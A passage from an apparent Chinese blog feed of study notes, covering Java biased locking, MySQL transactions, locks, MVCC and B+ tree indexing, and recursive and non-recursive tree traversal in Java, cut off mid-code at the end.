src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g0o9wodtj30uz0b8dhe.jpg" alt="image-20221124103939951"></p><h4 id="偏向锁"><a href="#偏向锁" class="headerlink" title="偏向锁"></a>偏向锁</h4><p>偏向锁是对轻量级锁的再次优化，之前使用轻量级锁方案时，每次获取锁都要和Object的对象头做CAS操作，即便是重入锁，也需要该操作。现在希望Object对象头上直接写占有锁的线程ID，这样只要比较，不进行CAS操作。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g111ax0wj30p70jqmz0.jpg" alt="image-20221124105155494"></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g118jj14j30ov0dagmr.jpg" alt="image-20221124105207495"></p><p>查看对象头的信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.openjdk.jol<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jol-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    // 这里需要注意，不用provided</span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g1m9xer0j30sx0c276u.jpg" alt="image-20221124111220643"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">start</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"><span class="comment">//        0x0000000000000001</span></span><br><span class="line">        System.err.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">        Thread.sleep(<span class="number">4000</span>);</span><br><span class="line"><span class="comment">//        延迟显示，不延迟：-XX:BiasedLockingStartupDelay=0</span></span><br><span class="line">        System.err.println(ClassLayout.parseInstance(o).toPrintable());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>适用范围：锁竞争少。</p><p>如果是多线程竞争，可以设置关闭偏向锁，默认是开启的，适用：<code>-XX:-UseBiasedLocking</code></p><blockquote><p>需要注意：当使用了对象的.hashcode()方法会变为不可偏向</p></blockquote><p>因为在偏向锁中对象头没有位置存储HashCode，所以转为轻量级锁或者重量级锁。每个对象最初的HashCode为0，第一次使用时，进行赋值。</p><h3 id="线程安全的集合类"><a href="#线程安全的集合类" class="headerlink" title="线程安全的集合类"></a>线程安全的集合类</h3><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8g22iaj76j30to06caam.jpg" alt="image-20221124112756210"></p><p>这里分为三类</p><ol><li><p>遗留的：HashTable（Map），Vector（List）</p></li><li><p>使用 Collections 装饰的线程安全集合，如：Collections.synchronizedCollection，可以将线程不安全的集合包装为线程安全的，底层实际上就是方法调用时包装类对原先方法加锁。  </p></li><li><p>JUC包下的类</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 并发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql的事务与索引</title>
      <link href="/2022/11/25/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E7%9A%84%E4%BA%8B%E5%8A%A1%E4%B8%8E%E7%B4%A2%E5%BC%95/"/>
      <url>/2022/11/25/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E7%9A%84%E4%BA%8B%E5%8A%A1%E4%B8%8E%E7%B4%A2%E5%BC%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql事务与索引"><a href="#Mysql事务与索引" class="headerlink" title="Mysql事务与索引"></a>Mysql事务与索引</h1><blockquote><p>​    需求：先从数据库中读取摸一个字段的值，然后在该字段上的基础上进行修改，由于操作不是原子性，无法保证线程安全，也就是当A线程读取到1时，想+1，赋值为2。而B线程已经将数据修改为2了，那么A线程应该是在2的基础上+1，赋值为3。但实际中可能该值都到8了，A又给人家改回2了。所以我们该如何解决数据安全问题？</p></blockquote><ol><li>本能想到利用JVM层面的锁机制，保证每次只有一个线程进行操作，但这个性能太差，而且JVM锁无法在分布式中生效。</li><li>利用数据库事务操作，下文我们主要讲Mysql事务的知识。</li></ol><h2 id="数据库事务"><a href="#数据库事务" class="headerlink" title="数据库事务"></a>数据库事务</h2><p>​    在讲事务之前，我们需要明确Mysql中只有Inndb支持事务，如果是其他存储引擎则无法使用事务，所以我们应先检查自己的存储引擎是否正确。</p><ol><li>查看数据库支持的存储引擎：<code>show engines</code></li><li>查看自己的表使用的引擎：<code>show table status from 数据库名 where name = &#39;表名&#39;;</code></li><li>修改表的存储引擎：<code>ALTER TABLE 表名 ENGINE=引擎名称;</code></li><li>查看是否是自动提交：<code>show variables like &#39;autocommit&#39;;</code></li><li>关闭自动提交: <code>SET AUTOCOMMIT = 0;</code> </li><li>打开自动提交：<code>set AUTOCOMMIT = 1;</code></li><li>事务的隔离级别有哪些：<ol><li><code>Read Uncommitted</code>（读取未提交内容）<ul><li>别人开启事务，修改数据，但还未提交，你这边就读取到了修改的数据，存在脏读现象</li></ul></li><li><code>Read Committed</code>（读取提交内容）<ul><li>存在不可重复读现象，意思就是当A在开启事务后，先查询了一次数据，在这期间B也开启事务，并commit了一条数据，当A再查询的时候数据发现查询到的数据不一致了，</li></ul></li><li><code>Repeatable Read</code>（可重读）<ul><li>当A开启一个事务后，读取的数据是锁死的，不会因为外界的修改。但会有幻读的可能</li></ul></li><li><code>Serializable</code>（可串行化）<ul><li>隔离级别最高，事务必须一个个进行，相当于Java中的synchronize，但是效率很低。安全性最高</li></ul></li></ol></li><li>查看数据库支持的事务隔离级别：<code>SELECT @@global.tx_isolation;</code></li><li>修改事务的隔离级别：（seesion表示当前作用域下，如果想改变全局作用域使用：global，这里修改只是临时操作，要永久操作需要在配置文件中修改）<ol><li><code>set session transaction isolation level repeatable read;</code> 设置会话隔离级别为可重复读</li><li><code>set session transaction isolation level read uncommitted;</code> 设置会话隔离级别为读未提交</li><li><code>set session transaction isolation level read committed;</code> 设置会话隔离级别为读已提交</li><li><code>set session transaction isolation level serializable;</code> 设置会话隔离级别为可串行化</li></ol></li></ol><h3 id="各个隔离级别存在问题的概念"><a href="#各个隔离级别存在问题的概念" class="headerlink" title="各个隔离级别存在问题的概念"></a>各个隔离级别存在问题的概念</h3><ol><li>脏读：好比我们写作文打草稿，写好了再上传提交，应只能看到最后提交的作品，现在是你打草稿我们都能看到了。</li><li>不可重复读：写作文，我们打草稿的时候，实在不会写，上网翻翻别人提交上传的优秀作文，抄一会儿不小心刷新页面了，发现尼玛怎么和之前不一样了。原来是别人又修改了一下，然后从新上传了。不可重复读重点在update和delete操作，官网写的</li><li>可重复读：与上面相对应，当我打草稿抄作文的时候，不管原作者怎么提交修改，我这边只能看到最初我打草稿那时看到的。相当于我为了保证数据不变，我截了个图。只看这张图。</li><li>幻读：侧重点在于数据的增加，比方说作文上传后，需要单独放在一张桌子上，我在打草稿前看了一眼，发现桌子上是空的，等我写的差不多了，我再看一眼桌子还是空的，但等我去放作文的时候，发现明明我看不到有东西，但显示已经有一个别人的作文了。仿佛自己出现了幻觉。幻读侧重于insert语句</li></ol><h2 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h2><h3 id="共享锁："><a href="#共享锁：" class="headerlink" title="共享锁："></a>共享锁：</h3><p>​    也称为读锁，多个事务间共享同一把锁，都可以获取到数据，但不能修改数据，否则可能造成死锁问题。</p><p>加锁：<code>select * from student where id = 1 lock in share mode</code></p><p>释放锁：<code>commit/rollback</code></p><h3 id="排他锁"><a href="#排他锁" class="headerlink" title="排他锁"></a>排他锁</h3><p>​    也叫做写锁，写锁与其他锁并不能共存，也就是说与共享锁，和其他排他锁都是互斥的。如果一个事务获取了一个数据行的排他锁，其他事务就也不能再获取这行的锁了，获取到锁的事务可以进行读和写</p><p>加锁：</p><p>​    自动：在<code>delete/update/insert</code>中默认加锁</p><p>​    手动：<code>select * from student where id = 1 for update;</code></p><p>释放锁：<code>commit/rollback</code></p><h3 id="意向锁（表级锁）"><a href="#意向锁（表级锁）" class="headerlink" title="意向锁（表级锁）"></a>意向锁（表级锁）</h3><p>​    意向锁是由数据引擎自己维护的，用户无法自己操作意向锁，</p><h4 id="IS意向共享锁"><a href="#IS意向共享锁" class="headerlink" title="IS意向共享锁"></a>IS意向共享锁</h4><p>​    一个数据行加入共享锁之前必须先获取到该表的IS锁</p><h4 id="IX意向排他锁"><a href="#IX意向排他锁" class="headerlink" title="IX意向排他锁"></a>IX意向排他锁</h4><p>​    一个事务在一个数据行加他排他锁之前需要获取到IX锁</p><blockquote><p>上面的意向锁到底有什么用？</p><blockquote><p>一个事务成功给一个表加上表锁的前提是什么？</p></blockquote></blockquote><p>​    肯定是这个表中任意数据行没有加上别的锁，那我当想给一个表加表锁时，难倒只能一行一行去判断有没有加锁操作？效率太低，且当你判断完第一个没问题，去判断第二个时，第一个被一个事务加锁了，你也不知道啊，所以使用意向锁，可以提高加表锁的效率，只要某个数据行有了意向排它锁，就说明不能加表锁    </p><blockquote><p>提问环节：</p><ol><li>行锁锁的是什么？ 是一行数据？是一个字段？还是索引？</li><li>当我们不给表加索引时，表是否含有主键索引？</li></ol><p>这里有现成的实验：<a href="https://blog.csdn.net/weixin_43935927/article/details/109438506">https://blog.csdn.net/weixin_43935927/article/details/109438506</a></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d8irzizj30uf0ft40b.jpg" alt="image-20220810182237613"></p><h3 id="Record-Lock：记录锁"><a href="#Record-Lock：记录锁" class="headerlink" title="Record Lock：记录锁"></a>Record Lock：记录锁</h3><p>条件：唯一性索引（唯一、主键）等值查询，精准匹配。</p><p><code>select * from t2 where id = 4 for update;</code>:锁住id = 4的数据</p><h3 id="Gap-Lock：间隙锁"><a href="#Gap-Lock：间隙锁" class="headerlink" title="Gap Lock：间隙锁"></a>Gap Lock：间隙锁</h3><p>条件：记录不存在，当我查询并加锁时，发现并没有击中索引，而是落入在一个索引的区间内，那么就会加一个间隙锁。那既然没数据我加间隙锁能干嘛？</p><p>防止插入，当你有一个间隙锁的时候，就不能再给这个间隙加数据，等等。。那这不就保证了不会在我看不见的情况下，别人突然insert一条数据了嘛。。。幻读的解决似乎在这里能找到解决的办法</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d8poknbj30k0059mxg.jpg" alt="image-20220810182800083"></p><h3 id="Next-Key-Lock：临键锁"><a href="#Next-Key-Lock：临键锁" class="headerlink" title="Next-Key Lock：临键锁"></a>Next-Key Lock：临键锁</h3><p>条件：范围查询，包含记录和区间。这里要注意临键是左开右闭的，(x,y]</p><p> <img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hekwp4gkj30k30713yt.jpg" alt="image-20220810183202191"></p><p>​    所以当有这几个锁的时候解决了什么问题呢？那就是解决了在<code>repeatable Read</code>事务隔离级别下，幻读的影响，当有了间隙锁，这个区间虽然你看不到，但你相当于已经对这个范围都加锁了，其他数据无法进行insert，所以最后的结论是下图：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d8riixdj30uc0a0myf.jpg" alt="image-20220810183658382"></p><blockquote><p>这里还有一点需要注意：select也分为<strong>快照读</strong>和<strong>当前读</strong>,这里做出一个解释</p></blockquote><ul><li><p>快照读简单理解就是：<code>select * from goods;</code>,在RR隔离级别下，每次读取到的数据都是一样的，当其他事务插入一条数据时，通过快照读读取到的内容还是不变。这保证了可重复读，但是解决不了幻读。</p></li><li><p>当前读简单理解就是：每次读取的内容都是最新的数据，并对其加锁，保证其他事务不会影响数据本身。具体使用比如：</p><ul><li><code>select * from goods lock in share mode;</code> 加入共享可读锁</li><li><code>select * from goods for update;</code> 加入排他锁</li><li><code>insert , update ,delete</code>默认是先进行当前读，对索引加上排他锁</li></ul></li></ul><h2 id="ACID的实现原理"><a href="#ACID的实现原理" class="headerlink" title="ACID的实现原理"></a>ACID的实现原理</h2><h3 id="atomicity原子性"><a href="#atomicity原子性" class="headerlink" title="atomicity原子性"></a>atomicity原子性</h3><blockquote><p>定义我们都知道，一个事务操作内，要么都成功，要么都失败，那Mysql是如何保证的？</p></blockquote><p>​    维护了一个<code>undo.log</code>文件，也就是我们在事务操作前都会记录一条反向操作SQL，当<code>commit</code>时，则<code>undo.log</code>标志该事务已经结束。如果出现异常，则进行<code>rollback</code>操作，通过<code>undo.log</code>文件执行反向操作，进行数据回滚。比如：</p><p>当我们执行：<code>update user set name = &quot;李四&quot; where id = 1;   *---修改之前name=张三*</code></p><p>undo文件记录：<code>update user set name = &quot;张三&quot; where id = 1;</code></p><h3 id="durability持久性"><a href="#durability持久性" class="headerlink" title="durability持久性"></a>durability持久性</h3><blockquote><p>定义：如果一个事务提交后，数据的修改是永久性的。</p></blockquote><p>​    维护一个<code>redo.log</code>文件，背景是我们知道磁盘IO是一个很慢的操作，所以Mysql也维护了一份Buffer缓冲区，操作都会先到缓冲区，最后同步到磁盘中。但缓冲区最大的问题就是数据的不安全，所以引入了<code>redo.log</code>文件，数据会先同步到<code>redo log buffer</code>中，<code>redo log buffer</code> 也是redo.log的缓冲区，然后事务提交后按照我们的约定再刷盘到redo.log文件中。</p><blockquote><p>那这里也会存在问题：</p></blockquote><ol><li> redo log buffer 文件能否保证数据不丢失?</li></ol><p>Mysql中数据操作单元是一个数据页，16k</p><p>​    redo.log中则记录的是对磁盘上的某个表空间的某个数据页的某一行数据的某个字段做了修改，修改后的值为多少，它记录的是对物理磁盘上数据的修改，因此称之为物理日志。</p><p>​    <code>redo log buffer</code>是在commit之前就记录了，如果在commit之后再记录就不可能保证数据安全，因为commit后一瞬间挂机不就完了。所以当commit时，我们可以根据<code>innodb_flush_log_at_trx_commit</code> 来决定将<code>redo log buffer</code>什么时候刷盘到<code>redo.log</code>文件中。</p><ul><li><strong>设置为0的时候，表示每次事务提交时不进行刷盘操作，等待主线程每秒刷盘</strong></li><li><strong>设置为1的时候，表示每次事务提交时都同步进行刷盘操作（默认值，因为够安全）</strong></li><li><strong>设置为2的时候，表示每次事务提交时都异步，只把redo log buffer内容写入page cache</strong></li></ul><ol start="2"><li>为什么宁可写到redo.log文件中，而不是直接写到数据库文件中？</li></ol><p>redo.log使用的顺序IO，只追加修改的数据，而从buffer为随机IO，写入数据文件，是按照一个数据页写入的。</p><h3 id="isolation隔离性"><a href="#isolation隔离性" class="headerlink" title="isolation隔离性"></a>isolation隔离性</h3><p>隔离性保证有两种：</p><ol><li>想Java中一样加入锁，每个事务在操作时，只有一个事务获取到锁并操作，效率低</li><li>MVCC多版本并发控制（Mysql中对RC和RR的默认管理）</li></ol><h4 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h4><p>select读取分为：快照读和当前读</p><p>快照读就好像是照了张相，但肯定是以前了，数据不一定准确。</p><p>当前读表示读取到的就是最新的数据，比如：update，insert，delete就是当前读，会先获取最新数据，加入行锁。如果想让select也为当前读：<code>select * from table for update || select * from table lock in share mode </code></p><blockquote><p>MVCC是基于快照读的。但又有不同，我们下面来看一下RC和RR底层到底有什么不同？</p></blockquote><p>首先MVCC的关键在于<code>版本链，ReadView视图，事务ID</code>来区分。可以看这里的图：<a href="/Users/qinsicheng/Desktop/%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E5%BA%93/mysqlMvcc.drawio">本地链接</a></p><p>至于RC与RR的区别则在于生成ReadView时机不同，在RC中每次select 都会生成一个readView，所以数据也在不断更新</p><p>而RR则是以事务为单位，当第一个select时生成ReadView，后面再次select就共用一个。所以叫可重复读</p><p>而为什么说幻读也可解决：这里分为当前读与快照读</p><p>当前读：默认加入了间隙锁，保证这一段区间内读的时候也加锁了，别人无法操作</p><p>快照读：则是外界的修改，事务内只读取一次，所以也不影响。</p><p>​    外界对幻读的定义也并不是统一的。这里我的理解是，幻读是当事务执行后，虽然读取不到该数据，但是却可以修改或删除该数据，就像幻觉一样，而修改与删除是因为使用的当前读所以可以获取到最新的数据</p><h3 id="consistency一致性"><a href="#consistency一致性" class="headerlink" title="consistency一致性"></a>consistency一致性</h3><p>ADI特性是为了保证数据的一致性。</p><h2 id="索引底层：B-树"><a href="#索引底层：B-树" class="headerlink" title="索引底层：B+树"></a>索引底层：B+树</h2><p><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a> 动态图显示</p><p>我们都知道Mysql索引底层是B+树，那为什么使用B+数呢？能不能想HashMap那样使用索引？</p><ol><li>Hash结构</li></ol><p>​    元素插入与访问都非常的快，如果Hash值碰撞，也可以使用链表。但当数据量太多就查询太慢了，就好像HashMap超过边界变为红黑树。所以Hash的缺点有两个：</p><ul><li>在数据量大时，查询效率太低</li><li>Hash值无序，在我们使用索引时经常遇到范围查找，Hash没法操作</li></ul><ol start="2"><li>平衡二叉树</li></ol><p>​    平衡二叉树的特点就是二叉树结构，高度不会超过1层，会有自平衡。但随着树高度的增加，查找就越慢，而且如果我们查找范围数据时，需要不断回旋搜索。比如说<code>select * from table where id &gt;= 10</code>,当我们在树中找到10这个节点，剩下节点需要回旋搜索</p><ol start="3"><li>B树</li></ol><p>多个节点合在一起，这样树的高度就降低了，查询速度是要比平衡二叉树解决了，但仍然存在回旋查找的问题</p><ol start="4"><li>B+树</li></ol><p>解决了回旋查找的问题，整体结构相当于B树的形成，然后每个节点形成一个链表的关系，这样就没有了回旋查找的问题</p><blockquote><p>这里我是看了上面动态图插入流程体会到的，可能有些错误，还是需要有时间了解具体实现。</p></blockquote><h2 id="索引失效问题"><a href="#索引失效问题" class="headerlink" title="索引失效问题"></a>索引失效问题</h2><blockquote><p>select 前加入 explain 可显示是否使用了索引，其中属性值：</p><blockquote><p>id:选择标识符<br>select_type:表示查询的类型。<br>table:输出结果集的表<br>partitions:匹配的分区<br>type:表示表的连接类型（ ALL、index、range、 ref、eq_ref、const、system、NULL（从左到右，性能从差到好））<br>possible_keys:表示查询时，可能使用的索引<br>key:表示实际使用的索引<br>key_len:索引字段的长度<br>ref:列与索引的比较<br>rows:扫描出的行数(估算的行数)<br>filtered:按表条件过滤的行百分比<br>Extra:执行情况的描述和说明</p></blockquote></blockquote><p>索引失效的情况网上有许多测试数据，可以直接查找，我们这里从底层说明为什么索引会失效。下图是对<code>a字段和b字段加入联合索引，索引底层B+树的样子</code></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d8w2upsj30ni0e5wfd.jpg" alt="image-20221116173602058"></p><p>通过上面的图我们能发现几个规则：</p><ol><li>a的值是有序的，b的值是无序的</li><li>当a相同时，b是有序的，这在我们多个排序条件时，如果第一个相同，再排第二个是一致的</li></ol><blockquote><p>分析情况来说明</p></blockquote><p>​    <code>like &quot;%i&quot; || like &quot;i%&quot; || like &quot;%i%&quot;</code> 之间的不同</p><ul><li>like ‘%i’ 表示前面什么都可以，以i结尾，根据上图，当a不同时，b是无序的，所以无法使用索引</li><li>like ‘i%’ 表示以i开头，根据上图a相同时，b是有序的，所以可以用到索引</li><li>like ‘%i%’ 和情况1一样，无法使用索引</li></ul><blockquote><p>​    索引失效的最本质原因就是：索引在底层的存储一定是有序的，如果要使用索引也应该有序，当使用联合索引时，应保证索引从左至右。这条规则对普通索引也有效。比如说对<code>name</code>加索引，有三个值，<code>abc,acb,aaa</code>，在添加索引时先看第一位，发现都是a，再看第二位，发现不一样了，这时也是按顺序排序的，最终一定是<code>aaa,abc,acb</code>,这里最简单的方式：我们已经知道索引的结构是B+树，通过上面的网址自己插入这几个值，看是怎么排序的。</p></blockquote><h2 id="MyISAM-和-Innodb的索引区别"><a href="#MyISAM-和-Innodb的索引区别" class="headerlink" title="MyISAM 和 Innodb的索引区别"></a>MyISAM 和 Innodb的索引区别</h2><blockquote><p>MyIsam 数据和索引是分为两个文件存储的，左边的图为索引，右边为数据，索引的key为主键id，value为数据的地址，</p><p>不管是主键索引还是普通索引都是通过地址去查找数据</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d8yj7pij314a0idwh4.jpg" alt="image-20221116181734434"></p><blockquote><p>Innodb 的索引，也叫聚簇索引，索引与数据班是在一起的</p><blockquote><p>​    左边的图，每个节点上的key是唯一主键ID，值就是这一整行的数据，当通过Id查询时速度最快</p><p>​    右边的图，以name为索引，每个节点的key是name，value则是主键ID，再通过ID去主键索引中获取数据（这里如果我们没有设置主键索引，Innodb会找唯一自增索引去当做主键索引，如果这个也没有，会使用隐藏字段生成一个主键）</p><p>​    索引：分为主键索引和普通索引，主键索引直接拿数据，普通索引找主键索引找数据（性能相对比MyISAM低），</p></blockquote></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h89d91i930j316q0hudiv.jpg" alt="image-20221116181403045"></p><h2 id="百万级数据索引优化"><a href="#百万级数据索引优化" class="headerlink" title="百万级数据索引优化"></a>百万级数据索引优化</h2><ol><li><p>索引失效：</p><ul><li>计算：如：<code>+ ,- ,* ,/ ,!= ,&lt;&gt; ,is null ,is not null, or</code></li><li>函数：如：<code>sum(),round()等等</code></li><li>手动/自动类型转化，如: id = “1”，id本身是数字，给写成字符串了（这里我用mysql8发现也可以使用索引）</li></ul></li><li><p>尽量少使用<code>select * 因为这会导致无法使用覆盖索引</code>，覆盖索引的意思是 <code>select name where name = &#39;&#39; and  age = &#39;&#39;</code>，name在查询条件的覆盖范围内.select * 也会查询到许多不必要的字段，导致网络传输的性能损耗。</p></li><li><p><code>like %</code>操作应注意，应避免%开头，但如果是覆盖索引的话，是可以用到索引的！！！, 也就是说使用%i,在使用覆盖索引的情况下，是可以使用索引查询到的</p></li><li><p><code>Order by</code>如果使用覆盖索引的话也可以被优化用索引，否则数据会被存入内存中的一个空间，再进行排序，而不是利用索引进行排序</p></li><li><p>用Java操作，要比数据库本身操作快的多</p></li></ol><h2 id="联合索引与单个索引的区别"><a href="#联合索引与单个索引的区别" class="headerlink" title="联合索引与单个索引的区别"></a>联合索引与单个索引的区别</h2><p>​    联合索引遵从最左前缀法则，当我们给<code>a,b,c</code>加入联合索引时，在<code>a || a,b || a,b,c</code>查询时都会使用到索引，联合索引相当于对多个列建索引，并且只建一次。</p><p>​    单个索引时，给<code>a ,b ,c</code>单独加入索引时，当查询<code>a,b,c</code>时，只有最前面的索引被使用，而且如果多个字段添加独立索引，也会导致资源的浪费。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树结构</title>
      <link href="/2022/11/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E7%BB%93%E6%9E%84/"/>
      <url>/2022/11/25/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="树形dp套路"><a href="#树形dp套路" class="headerlink" title="树形dp套路"></a>树形dp套路</h1><p><strong>在做树结构的题目中，如果求解规则可以分为，以某个节点为子树，先向左要数据，再向右要数据，最后返回总数据，我们就可以使用该套路。</strong></p><ol><li><p><strong>递归进行遍历</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">QTraverse2</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tree == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;先序&quot;</span>);</span><br><span class="line">        QTraverse2(tree.left);</span><br><span class="line">        System.out.println(<span class="string">&quot;中序&quot;</span>);</span><br><span class="line">        QTraverse2(tree.right);</span><br><span class="line">        System.out.println(<span class="string">&quot;后续&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>非递归进行遍历</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非递归前序遍历  使用栈</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">QTraverse1</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">       Stack&lt;Point&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">       stack.add(tree);</span><br><span class="line">       <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">           <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">           System.out.print(pop.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">               stack.add(pop.right);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               stack.add(pop.left);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//非递归中序遍历</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ZTraverse1</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">       Stack&lt;Point&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">       stack.add(tree);</span><br><span class="line">       <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">           <span class="keyword">while</span> (tree.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               stack.add(tree.left);</span><br><span class="line">               tree = tree.left;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">           System.out.print(pop.value + <span class="string">&quot; &quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (pop.right != <span class="literal">null</span>) &#123;</span><br><span class="line">               stack.add(pop.right);</span><br><span class="line">               tree = pop.right;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//非递归后序遍历</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">HTraverse1</span><span class="params">(Point tree)</span> &#123;</span><br><span class="line">       Stack&lt;Point&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">       Stack&lt;Point&gt; stack1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">       stack.add(tree);</span><br><span class="line">       <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">           <span class="type">Point</span> <span class="variable">pop</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">           stack1.add(pop);</span><br><span class="line">           <span class="keyword">if</span> (pop.left != <span class="literal">null</span>) &#123;</span><br><span class="line">               